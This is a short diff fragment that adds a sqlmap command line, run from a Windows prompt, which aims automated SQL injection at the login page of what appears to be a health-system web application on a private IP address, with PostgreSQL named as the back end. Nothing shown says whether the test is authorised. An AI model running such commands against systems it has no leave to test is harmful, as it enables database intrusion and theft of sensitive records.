@@ -1,0 +1,3 @@
+C:\sqlmap>
+
+python sqlmap.py --method=POST --data="parametro=authenticateOnDb&challenge=&sessionChallenge=&username="  --dbms PostgreSQL -u https://10.1.14.20/ir-salud/web/login.php
